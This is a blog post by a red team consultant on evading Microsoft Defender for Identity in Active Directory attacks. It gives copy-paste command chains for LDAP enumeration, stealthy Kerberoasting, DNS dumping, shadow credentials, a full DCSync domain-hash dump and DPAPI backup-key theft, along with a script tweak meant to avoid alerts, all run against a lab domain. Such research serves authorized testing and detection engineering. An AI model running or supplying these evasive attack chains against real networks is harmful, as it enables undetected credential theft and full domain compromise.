<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Outsmarting Microsoft Defender for Identity | home</title>
<meta name=keywords content><meta name=description content="In this blog post we will be exploring techniques to navigate the detection capabilities of Microsoft Defender for Identity by understanding its blind spots. We will look at how attackers can exploit these gaps and avoid out-of-the-box detection and giving insight into the challenges of securing advanced identity protection systems."><meta name=author content="c"><link rel=canonical href=https://cschwarz1.github.io/posts/0x06/><link crossorigin=anonymous href=/assets/css/stylesheet.min.53f81af29c57af3dd9604ce7c5615b0774f767904dbea02b2c5240477107b055.css integrity="sha256-U/ga8pxXrz3ZYEznxWFbB3T3Z5BNvqArLFJAR3EHsFU=" rel="preload stylesheet" as=style><link rel=icon href=https://cschwarz1.github.io/favicon.ico><link rel=apple-touch-icon href=https://cschwarz1.github.io/apple-touch-icon.png><link rel=alternate hreflang=en href=https://cschwarz1.github.io/posts/0x06/><meta name=twitter:card content="summary"><meta name=twitter:title content="Outsmarting Microsoft Defender for Identity | home"><meta name=twitter:description content="In this blog post we will be exploring techniques to navigate the detection capabilities of Microsoft Defender for Identity by understanding its blind spots. We will look at how attackers can exploit these gaps and avoid out-of-the-box detection and giving insight into the challenges of securing advanced identity protection systems."><meta property="og:title" content="Outsmarting Microsoft Defender for Identity | home"><meta property="og:description" content="In this blog post we will be exploring techniques to navigate the detection capabilities of Microsoft Defender for Identity by understanding its blind spots. We will look at how attackers can exploit these gaps and avoid out-of-the-box detection and giving insight into the challenges of securing advanced identity protection systems."><meta property="og:type" content="article"><meta property="og:url" content="https://cschwarz1.github.io/posts/0x06/"><meta property="og:image" content="https://cschwarz1.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-01-18T15:31:35+07:00"><meta property="article:modified_time" content="2025-01-18T15:31:35+07:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cschwarz1.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Outsmarting Microsoft Defender for Identity","item":"https://cschwarz1.github.io/posts/0x06/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Outsmarting Microsoft Defender for Identity | home","name":"Outsmarting Microsoft Defender for Identity","description":"In this blog post we will be exploring techniques to navigate the detection capabilities of Microsoft Defender for Identity by understanding its blind spots. We will look at how attackers can exploit these gaps and avoid out-of-the-box detection and giving insight into the challenges of securing advanced identity protection systems.","keywords":[],"wordCount":"1983","inLanguage":"en","datePublished":"2025-01-18T15:31:35+07:00","dateModified":"2025-01-18T15:31:35+07:00","author":{"@type":"Person","name":"c"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cschwarz1.github.io/posts/0x06/"},"publisher":{"@type":"Organization","name":"home","logo":{"@type":"ImageObject","url":"https://cschwarz1.github.io/favicon.ico"}}}</script><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript></head><body class="dark type-posts kind-page layout-" id=top><script data-no-instant>function switchTheme(e){switch(e){case"light":document.body.classList.remove("dark");break;case"dark":document.body.classList.add("dark");break;default:window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")}}function isDarkTheme(){return document.body.className.includes("dark")}function getPrefTheme(){return localStorage.getItem("pref-theme")}function setPrefTheme(e){switchTheme(e),localStorage.setItem("pref-theme",e)}const toggleThemeCallbacks={};toggleThemeCallbacks.main=e=>{setPrefTheme(e?"light":"dark")},window.addEventListener("toggle-theme",function(){const e=isDarkTheme();for(const t in toggleThemeCallbacks)toggleThemeCallbacks[t](e)});function toggleThemeListener(){window.dispatchEvent(new CustomEvent("toggle-theme"))}</script><script>(function(){const t="dark",e=getPrefTheme(),n=e||t;switchTheme(n)})()</script><header class=header><nav class=nav><div class=logo><a href=https://cschwarz1.github.io/ accesskey=h title="home (Alt + H)">home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://cschwarz1.github.io/categories/ title=categories>categories</a></li><li><a href=https://cschwarz1.github.io/tags/ title=tags>tags</a></li><li><a href=https://cschwarz1.github.io/aboutme/ title="about me">about me</a></li></ul></nav></header><main class="main post"><article class=post-single><header class=post-header><h1 class=post-title>Outsmarting Microsoft Defender for Identity</h1><div class=post-description>In this blog post we will be exploring techniques to navigate the detection capabilities of Microsoft Defender for Identity by understanding its blind spots. We will look at how attackers can exploit these gaps and avoid out-of-the-box detection and giving insight into the challenges of securing advanced identity protection systems.</div><div class=post-meta><span class=meta-item><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select:text"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select:text"/><line x1="16" y1="2" x2="16" y2="6" style="user-select:text"/><line x1="8" y1="2" x2="8" y2="6" style="user-select:text"/><line x1="3" y1="10" x2="21" y2="10" style="user-select:text"/></svg>
<span>January 18, 2025</span></span><span class=meta-item>
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text" style="user-select:text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z" style="user-select:text"/><polyline points="14 2 14 8 20 8" style="user-select:text"/><line x1="16" y1="13" x2="8" y2="13" style="user-select:text"/><line x1="16" y1="17" x2="8" y2="17" style="user-select:text"/><polyline points="10 9 9 9 8 9" style="user-select:text"/></svg>
<span>1983 words</span></span><span class=meta-item>
<svg width="24" height="24" viewBox="0 0 24 24" stroke="currentcolor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>10 min</span></span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a></li><li><a href=#ldap-reconnaissance aria-label="LDAP Reconnaissance">LDAP Reconnaissance</a></li><li><a href=#kerberoasting aria-label=Kerberoasting>Kerberoasting</a></li><li><a href=#dns-dumps aria-label="DNS Dumps">DNS Dumps</a></li><li><a href=#smbclient-and-accessing-filesystems aria-label="Smbclient And Accessing Filesystems">Smbclient And Accessing Filesystems</a></li><li><a href=#shadow-credentials aria-label="Shadow Credentials">Shadow Credentials</a></li><li><a href=#dcsync aria-label=DCSync>DCSync</a></li><li><a href=#dpapi aria-label=DPAPI>DPAPI</a></li><li><a href=#improvements-over-previous-versions-of-mdi aria-label="Improvements Over Previous Versions Of MDI">Improvements Over Previous Versions Of MDI</a></li></ul></div></details></div><div class=post-content><h2 id=introduction>Introduction</h2><p>As part of my work as an offensive security consultant, I had many encounters with MDI&rsquo;s defense mechanisms. This blog post walks through some interesting findings that might be useful for other red teamers and pentesters working on similar assessments.</p><p>The goal here is pretty straightforward - I want to share some attack paths and techniques I discovered during authorized testing that could help improve both red team exercises and defensive strategies. While I&rsquo;m not claiming to have discovered anything groundbreaking here, I&rsquo;ve got some useful insights to share. Security researchers like Nikhil Mittal from Altered Security and the team at Synacktiv for example have already done great work documenting MDI&rsquo;s behavior. You can find their excellent work <a href=https://files.brucon.org/2022/0wn-premises%20Bypassing%20Microsoft%20Defender%20for%20Identity.pdf>here</a> and <a href=https://www.synacktiv.com/en/publications/a-dive-into-microsoft-defender-for-identity>here</a>. Since MDI keeps evolving and I tend to approach things a bit differently in my engagements, I&rsquo;ll show you what techniques still work, where you need to watch your step, and what attempts will get you caught. Please be aware not to fall into a false sense of security when red teaming mature environments with the presented techniques. Savvy blue teams often customize Microsoft Defender for Identity (MDI) and other Defender modules and build additional detections and metrics to monitor activity. Never underestimate the diligence of a skilled and curious blue teamer, especially when executing commands on sensitive systems. Consider yourself warned—now, let’s get started!</p><h2 id=ldap-reconnaissance>LDAP Reconnaissance</h2><p>Let&rsquo;s start with enumeration. In my engagements I mostly only need full user and computer object details, maybe some password policy info. Pretty much everything I require I can just extract from those 2-3 LDAP queries. You can grab this data and process it offline using <code>jq</code> to parse the JSON output. While an &ldquo;expensive&rdquo; LDAP query that dumps the full object tree for all users or computers is supposed to trigger MDI&rsquo;s alarms (since it can generate hundreds of MBs of text data), I&rsquo;ve used this technique across multiple red team engagements without setting off any out-of-the-box alerts.</p><p>Here is the command that fetches all of the user objectclass:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldeep ldap -s ldaps://winterfell.north.sevenkingdoms.local -d north.sevenkingdoms.LOCAL <span class=se>\\</span> 
</span></span><span class=line><span class=cl>-u eddard.stark -p <span class=s1>&#39;FightP3aceAndHonor!&#39;</span> search <span class=s2>&#34;(objectClass=user)&#34;</span>
</span></span></code></pre></div><p>Other queries i used throughout my tests without any alerts are:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=o>(</span><span class=nv>objectClass</span><span class=o>=</span>user<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=nv>objectClass</span><span class=o>=</span>domain<span class=o>)</span>
</span></span></code></pre></div><p>Once this information is obtained you can pretty much extract all the necessary data for a nearly full picture of the target Active Directory.</p><p>You can extract detailed information from the offline dump, such as identifying all administrative accounts and their associated group memberships (e.g. Domain Admin accounts), using this command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat ldap_users.txt <span class=p>|</span> jq <span class=s1>&#39;.[] | select(.adminCount != null) | select(.adminCount | contains(1)) | \\
</span></span></span><span class=line><span class=cl><span class=s1>.sAMAccountName, .description, .name, .memberOf&#39;</span>
</span></span></code></pre></div><p>During a recent engagement, although the blue team had configured Microsoft Defender for Identity (MDI) with low alert thresholds and test mode settings, it still didn&rsquo;t generate any alerts. It&rsquo;s worth noting that LDAP queries still generate telemetry logs. This means if you&rsquo;re operating against (or alongside) an experienced blue team, they&rsquo;ll likely detect these activities through log analysis, even if automated alerts don&rsquo;t trigger.</p><h2 id=kerberoasting>Kerberoasting</h2><p>Kerberoasting is a powerful attack technique that continues to be widely used in red teaming due to its low detection rate and potential for significant privilege escalation.</p><p>Here’s what I tested without triggering any alerts:</p><ol><li><strong>Extract Kerberoastable Users:</strong> Perform an full users objectclass LDAP dump and extract users with SPNs set, then request a service ticket using Impacket scripts with time delays.</li><li><strong>Test Without Delays:</strong> Execute the same process without delays. However, if you’re paranoid like me, it’s still a good idea to introduce time intervals between service ticket (ST) requests, as this seems highly suspicious and can raise some eyebrows in the SOC. You can refer to my modified <code>GetUserSPNs.py</code> script for this.</li><li><strong>Use the Stealth Option in <code>GetUserSPNs.py</code>:</strong> This approach modifies the LDAP filter logic to exclude the SPN filter for the targeted user, making the process less detectable.</li></ol><p>It is worth mentioning that Microsoft Defender for Identity (MDI) correlates LDAP queries with ST requests to identify Kerberoasting attempts. If an attacker queries LDAP for a user with an SPN and then requests an ST shortly after (within seconds), MDI is likely to flag it as suspicious activity.</p><p>Here are the commands for easy copy pasting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># get kerberoastable users from ldap user dump</span>
</span></span><span class=line><span class=cl>cat ldap_users.txt <span class=p>|</span> jq <span class=s1>&#39;.[] | select(.objectCategory != null) | select(.objectCategory | test(&#34;CN=Person.*&#34;)) | \\ 
</span></span></span><span class=line><span class=cl><span class=s1>select(.servicePrincipalName != null) | select(.adminCount != null)| select(.adminCount | contains(1)) | \\ 
</span></span></span><span class=line><span class=cl><span class=s1>.sAMAccountName, .servicePrincipalName&#39;</span> &gt; kerberoastable_admins.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># use offline users i.e. request without LDAP query</span>
</span></span><span class=line><span class=cl>python GetUserSPNs.py essos/khal.drogo:<span class=s1>&#39;horse&#39;</span> -dc-ip 192.168.56.12 -request -usersfile kerberoastable_admins.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># use stealth option - omits the servicePrincipalName=* search filter</span>
</span></span><span class=line><span class=cl>python GetUserSPNs.py essos/khal.drogo:<span class=s1>&#39;horse&#39;</span> -dc-ip 192.168.56.12 -request -stealth
</span></span></code></pre></div><h2 id=dns-dumps>DNS Dumps</h2><p>With AD-integrated DNS (ADIDNS), you can dump the entire DNS server, revealing all resolvable systems. Currently, this activity isn&rsquo;t detected by MDI, providing red teamers the opportunity to map out the entire Active Directory as well as other systems like Linux servers, firewalls, web servers, etc. I use <a href=https://github.com/dirkjanm/adidnsdump>adidnsdump</a> by Dirk-Jan, it requires a (low-privileged) domain user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># dump the zones</span>
</span></span><span class=line><span class=cl>adidnsdump -u essos<span class=se>\\</span>khal.drogo -p <span class=s1>&#39;horse&#39;</span> meereen.essos.local --ssl --print-zones 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># dump hostnames for zone</span>
</span></span><span class=line><span class=cl>adidnsdump -u essos<span class=se>\\</span>khal.drogo -p <span class=s1>&#39;horse&#39;</span> meereen.essos.local --ssl --legacy --zone essos.local 
</span></span></code></pre></div><h2 id=smbclient-and-accessing-filesystems>Smbclient And Accessing Filesystems</h2><p>This is one of my favorite techniques, as it consistently delivers surprising results in most red team engagements. It&rsquo;s highly stealthy and can uncover significant findings. Extracting credentials or other valuable information from the filesystem can lead to reliable privilege escalation and writable file shares are an effective method for compromising web servers for example. I&rsquo;ve used this approach numerous times, as it essentially acts as a full-blown file upload vulnerability, often resulting in a SYSTEM shell.
Currently, Microsoft Defender for Identity (MDI) does not provide detection for file share access. This might be due to the potential for numerous false positives, making reliable detection challenging. To state the obvious be cautious when uploading web shells with known signatures, as they can trigger endpoint detection.</p><h2 id=shadow-credentials>Shadow Credentials</h2><p>You can configure shadow credentials on computer AD objects without alert for some reasons. To perform a stealthy DCSync attack (detailed in the next section), a Domain Controller hash is required so setting KeyCredentials on a Domain Controller becomes especially advantageous.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># list, should be empty because why would anyone set a KeyCredential on a DC ??</span>
</span></span><span class=line><span class=cl>certipy shadow -u <span class=s1>&#39;daenerys.targaryen@essos.local&#39;</span> -p <span class=s1>&#39;BurnThemAll!&#39;</span> -target meereen.essos.local list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># add</span>
</span></span><span class=line><span class=cl>certipy shadow -u <span class=s1>&#39;daenerys.targaryen@essos.local&#39;</span> -p <span class=s1>&#39;BurnThemAll!&#39;</span> -target meereen.essos.local add
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># clear</span>
</span></span><span class=line><span class=cl>certipy shadow -u <span class=s1>&#39;daenerys.targaryen@essos.local&#39;</span> -p <span class=s1>&#39;BurnThemAll!&#39;</span> -target meereen.essos.local clear
</span></span></code></pre></div><h2 id=dcsync>DCSync</h2><p>The DCSync attack chain combines many different techniques, none of them trigger alerts out-of-the-box in MDI in end of 2024.</p><p>If you have gained domain admin or similar access rights within AD and you really absolutely need to dump hashes on the DC here are the required steps:</p><ol><li><p>If delegation is denied on the DA, which it usually is in mature AD environments, use the compromised Domain Admin account to disable the NOT_DELEGATED UserAccountControl flag, so DA is allowed to be delegated. Use my fork of <a href=https://github.com/cschwarz1/ldap_shell>ldap_shell</a> to do this.</p></li><li><p>Add DA as Service Principle Name (SPN) to the Domain Controller to configure Kerberos based delegation</p></li><li><p>Configure resource-based constrained delegation (RBCD) on the Domain Controller to be able to impersonate any user (including the DC itself) on the DC</p></li><li><p>Request a Kerberos Service Ticket for the DC machine account on the DC</p></li><li><p>Add shadow credential to the DC</p></li><li><p>Obtain NTLM hash of DC with PKINIT ticket request. See the diff for <code>gettgtpkinit.py</code> in the comments below.</p></li><li><p>Impersonate DC and dump Active Directory with DCSync</p></li></ol><p>I am really surprised that none of these attacks in the whole chain will trigger an alert out of the box. But it is what it is. Below are the necessary steps. for UAC manipulation i used a custom ldap_shell program which can be found on my Github.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python ldap_shell essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!AndAll&#39;</span>
</span></span><span class=line><span class=cl>get_useraccountcontrol daenerys.targaryen
</span></span><span class=line><span class=cl>set_useraccountcontrol daenerys.targaryen <span class=m>1048576</span> <span class=nb>unset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># query</span>
</span></span><span class=line><span class=cl>addspn.py --target-type samname -t daenerys.targaryen --spn <span class=s2>&#34;cifs/meereen.essos.local&#34;</span> <span class=se>\\</span> 
</span></span><span class=line><span class=cl>-u <span class=s1>&#39;essos.local\daenerys.targaryen&#39;</span> -p <span class=s1>&#39;BurnThemAll!&#39;</span> -q meereen.essos.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># add</span>
</span></span><span class=line><span class=cl>addspn.py --target-type samname -t daenerys.targaryen --spn <span class=s2>&#34;cifs/meereen.essos.local&#34;</span> <span class=se>\\</span> 
</span></span><span class=line><span class=cl>-u <span class=s1>&#39;essos.local\daenerys.targaryen&#39;</span> -p <span class=s1>&#39;BurnThemAll!&#39;</span> meereen.essos.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># read</span>
</span></span><span class=line><span class=cl>rbcd.py -use-ldaps -delegate-to <span class=s2>&#34;meereen</span>$<span class=s2>&#34;</span> -delegate-from daenerys.targaryen -action <span class=nb>read</span> <span class=se>\\</span>
</span></span><span class=line><span class=cl>essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!&#39;</span> -debug
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set</span>
</span></span><span class=line><span class=cl>rbcd.py -use-ldaps -delegate-to <span class=s2>&#34;meereen</span>$<span class=s2>&#34;</span> -delegate-from daenerys.targaryen -action write <span class=se>\\</span> 
</span></span><span class=line><span class=cl>essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!&#39;</span> -debug
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>getST.py -spn <span class=s1>&#39;host/meereen.essos.local&#39;</span> -impersonate <span class=s1>&#39;meereen$&#39;</span> essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=s2>&#34;/home/kali/meereen.ccache&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>certipy shadow -k -target meereen.essos.local list
</span></span><span class=line><span class=cl>certipy shadow -k -target meereen.essos.local clear
</span></span><span class=line><span class=cl>certipy shadow -k -target meereen.essos.local add
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># slightly modified script as MDI alerted on forwardable tickets</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># &lt;     def build_asreq(self, domain = None, cname = None, kdcopts = []):</span>
</span></span><span class=line><span class=cl><span class=c1># ---</span>
</span></span><span class=line><span class=cl><span class=c1># &gt;     def build_asreq(self, domain = None, cname = None, kdcopts = [&#39;forwardable&#39;,&#39;renewable&#39;,&#39;renewable-ok&#39;]):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gettgtpkinit.py <span class=s1>&#39;essos.local/meereen$&#39;</span> -cert-pfx MEEREEN.pfx meereen.ccache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>meereen.ccache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python getnthash.py -key &lt;key&gt; <span class=s1>&#39;essos.local/meereen$&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>secretsdump.py essos.local/meereen<span class=se>\$</span>@192.168.56.12 -hashes :&lt;nthash&gt; -dc-ip 192.168.56.12 -just-dc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># clean up </span>
</span></span><span class=line><span class=cl>python addspn.py --target-type samname -t daenerys.targaryen --spn <span class=s2>&#34;cifs/meereen.essos.local&#34;</span> <span class=se>\\</span>
</span></span><span class=line><span class=cl>-u <span class=s1>&#39;essos.local\daenerys.targaryen&#39;</span> -p <span class=s1>&#39;BurnThemAll!AndAll&#39;</span> -dc-ip 192.168.56.12 -q meereen.essos.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python addspn.py --target-type samname -t daenerys.targaryen --spn <span class=s2>&#34;cifs/meereen.essos.local&#34;</span> <span class=se>\\</span> 
</span></span><span class=line><span class=cl>-u <span class=s1>&#39;essos.local\daenerys.targaryen&#39;</span> -p <span class=s1>&#39;BurnThemAll!AndAll&#39;</span> -dc-ip 192.168.56.12 -c meereen.essos.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># read</span>
</span></span><span class=line><span class=cl>proxychains4 rbcd.py -use-ldaps -delegate-to <span class=s2>&#34;meereen</span>$<span class=s2>&#34;</span> -delegate-from daenerys.targaryen -action <span class=nb>read</span> <span class=se>\\</span> 
</span></span><span class=line><span class=cl>essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!AndAll&#39;</span> -debug
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># remove</span>
</span></span><span class=line><span class=cl>rbcd.py -use-ldaps -delegate-to <span class=s2>&#34;meereen</span>$<span class=s2>&#34;</span> -delegate-from daenerys.targaryen -action remove <span class=se>\\</span> 
</span></span><span class=line><span class=cl>essos.local/daenerys.targaryen:<span class=s1>&#39;BurnThemAll!AndAll&#39;</span> -debug
</span></span></code></pre></div><h2 id=dpapi>DPAPI</h2><p>If you like to put screenshots of firewalls or backup admin web panels in your reports, then you&rsquo;ll likely want to extract browser credentials in post exploitation. The DPAPI (Data Protection API) backup key is a critical component of how DPAPI functions, enabling recovery of protected data when the original encryption keys are unavailable. In a domain environment, the backup key is managed by the Domain Controller and of course this seems a highly likely way to get caught trying to extract this. As of end of 2024 there is no alert (out-of-the-box) for dumping the domain backup key via DCSync. The standard tool from impacket extracts the keys via LDAP and NTDIS.dit, which should indeed trigger an <a href=https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts#malicious-request-of-data-protection-api-master-key-external-id-2020>alert</a> so I modified a version of this script to get the backup key via DRSUAPI. In combination with a DC hash this had given zero alerts so far. You can find my script on Github <a href=https://github.com/cschwarz1/dcsyncdpapikey>here</a>,these are the commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># full chain</span>
</span></span><span class=line><span class=cl>python3 dcsyncdpapikey.py domain/user:<span class=s1>&#39;pw&#39;</span>@target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># just dump GUIDS for backupkey via LDAP with a admin account, useful for OPSEC if you want to dcsync with DC machine hash</span>
</span></span><span class=line><span class=cl>python3 dcsyncdpapikey.py domain/user:<span class=s1>&#39;pw&#39;</span>@target -ldap-only
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># dump key via DCSync with extracted GUID</span>
</span></span><span class=line><span class=cl>python3 dcsyncdpapikey.py domain/DC<span class=se>\$</span>@target -hashes :hash -key-only --guid GUID
</span></span></code></pre></div><h2 id=improvements-over-previous-versions-of-mdi>Improvements Over Previous Versions Of MDI</h2><p>Over the years, some changes have been implemented, and this was not previously flagged. Exercise caution when performing the following actions.</p><p><strong>KeyCredentials on Sensitive Accounts:</strong> Setting a <code>KeyCredential</code> on sensitive accounts like Domain Admins has always triggered high-severity alerts. However, this has not typically been the case for machine accounts. An attack chain which I used commonly when targeting Azure cloud environments often involves compromising the AD Sync account, also known as <code>AZUREADSSOACC$</code>. This account is a machine account created automatically by Azure Active Directory Connect when Seamless Single Sign-On (Seamless SSO) is enabled. It acts as a service account in Active Directory (AD) to securely manage authentication between on-premises AD and Azure AD and with the comporimised NTLM hash it is possible to impersonate all cloud-synced user accounts via forged Kerberos service tickets. With a recent update, Microsoft has begun including the <code>AZUREADSSOACC$</code> object among accounts monitored for changes. Exercise caution when modifying this account, as it is crucial for seamless authentication. For more details, refer to the <a href=https://learn.microsoft.com/en-us/defender-for-identity/whats-new#august-2024>official documentation</a>.</p><p><strong>BloodHound Queries:</strong> While using BloodHound might seem straightforward, even with settings like throttling, jitter, or targeting domain controllers only (<code>dcOnly</code>), Microsoft Defender for Identity (MDI) detects queries against sensitive groups (e.g., Domain Admins, Enterprise Admins). This triggers a medium-severity alert labeled as <strong>&ldquo;LDAP Service Principal Reconnaissance.&rdquo;</strong></p><p><strong>Anonymous LDAP Pings (CLDAP):</strong> Performing anonymous LDAP pings will almost certainly trigger alerts. MDI classifies this as <strong>&ldquo;Account Enumeration Reconnaissance (LDAP)&rdquo;</strong> with a medium severity rating. You can find further details and a description of this alert <a href=https://learn.microsoft.com/en-us/defender-for-identity/reconnaissance-discovery-alerts>here</a>.</p></div><footer class=post-footer></footer><div class=comments-separator></div></article></main><footer class=footer><span>&copy; 2025 <a href=https://cschwarz1.github.io/>home</a></span><span style=display:inline-block;margin-left:1em>
<a href=https://creativecommons.org/licenses/by-sa/4.0/>CC BY-SA</a>
</span><span style=display:inline-block;margin-left:1em>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
    <a href=https://github.com/reorx/hugo-PaperModX/ rel=noopener target=_blank>PaperModX</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>(function(){const t=""=="1";if(t)return;let e=document.getElementById("theme-toggle");e.removeEventListener("click",toggleThemeListener),e.addEventListener("click",toggleThemeListener)})()</script><script>(function(){let e=document.getElementById("menu");e&&(e.scrollLeft=localStorage.getItem("menu-scroll-position"),e.onscroll=function(){localStorage.setItem("menu-scroll-position",e.scrollLeft)});const t=""=="1",n=""=="1";if(window.matchMedia("(prefers-reduced-motion: reduce)").matches||t||n)return;document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})})()</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>if(window.scrollListeners)for(const e of scrollListeners)window.removeEventListener("scroll",e);window.scrollListeners=[]</script><script src=/js/medium-zoom.min.js data-no-instant></script><script>(function(){const a=""=="1";if(!a)return;if(!document.querySelector(".toc")){console.log("no toc found, ignore toc scroll");return}const r=window.scrollListeners,t=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id]"),n="active";let e=t[0];o(e).classList.add(n);const c=()=>{const s=[];for(const e of t)if(l(e)<5)s.push(e);else break;s.length>0?newActiveHeading=s[s.length-1]:newActiveHeading=t[0],e!=newActiveHeading&&(o(e).classList.remove(n),e=newActiveHeading,o(e).classList.add(n))};let s=null;const i=()=>{s!==null&&clearTimeout(s),s=setTimeout(c,50)};window.addEventListener("scroll",i,!1),r.push(i);function o(e){const t=encodeURI(e.getAttribute("id")).toLowerCase();return document.querySelector(`.toc ul li a[href="#${t}"]`)}function l(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect();return t.top}})()</script></body></html>